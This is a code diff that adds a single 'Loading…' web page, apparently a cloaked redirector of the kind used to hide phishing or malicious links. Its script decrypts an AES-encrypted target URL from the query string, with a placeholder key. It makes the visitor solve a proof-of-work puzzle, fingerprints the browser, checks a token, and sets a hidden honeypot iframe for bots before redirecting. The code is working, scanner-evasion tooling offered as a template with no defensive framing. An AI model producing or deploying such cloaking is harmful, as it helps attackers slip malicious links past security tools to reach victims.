@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>Loading…</title>
+  <meta name="robots" content="noindex,nofollow">
+  <style>body{margin:0;height:100vh;background:#fff;}</style>
+</head>
+<body>
+  <!-- Honeypot: triggers trap -->
+  <iframe src="/trap" style="display:none;"></iframe>
+
+  <script>
+  (async()=>{
+    if('serviceWorker' in navigator){
+      try{await navigator.serviceWorker.register('/assets/sw.js');}catch{};
+    }
+    const p=new URLSearchParams(location.search);
+    const enc=p.get('q')||'';
+    const token=p.get('t')||'';
+    // Decrypt payload
+    async function decrypt(hex){
+      const keyHex='REPLACE_WITH_YOUR_AES_KEY';
+      const iv=Uint8Array.from(hex.slice(0,32).match(/.{2}/g).map(b=>parseInt(b,16)));
+      const data=Uint8Array.from(hex.slice(32).match(/.{2}/g).map(b=>parseInt(b,16)));
+      const key=await crypto.subtle.importKey('raw',Uint8Array.from(keyHex.match(/.{2}/g).map(b=>parseInt(b,16))),'AES-GCM',false,['decrypt']);
+      const dec=await crypto.subtle.decrypt({name:'AES-GCM',iv},key,data);
+      return JSON.parse(new TextDecoder().decode(dec)).url;
+    }
+    let target; try{target=await decrypt(enc);}catch{return;}
+    // PoW challenge
+    const {challenge,difficulty}=await fetch('/puzzle').then(r=>r.json());
+    async function solve(c,d){const E=new TextEncoder();for(let n=0;;n++){const h=new Uint8Array(await crypto.subtle.digest('SHA-256',E.encode(c+n)));let z=0;for(let b of h){for(let i=7;i>=0;i--){if(((b>>i)&1)===0)z++;else{i=-1;break;}if(z>=d)return n;}}}};
+    const nonce=await solve(challenge,difficulty);
+    const fingerprint=btoa(navigator.userAgent+'|'+Intl.DateTimeFormat().resolvedOptions().timeZone);
+    const ok=await fetch('/validate',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({token,fingerprint,nonce})});if(!ok.ok)return;
+    const swok=await fetch('/sw-challenge',{headers:{'X-Redirect-OK':token}});if(!swok.ok)return;
+    window.location.replace(target);
+  })();
+  </script>
+</body>
+</html>
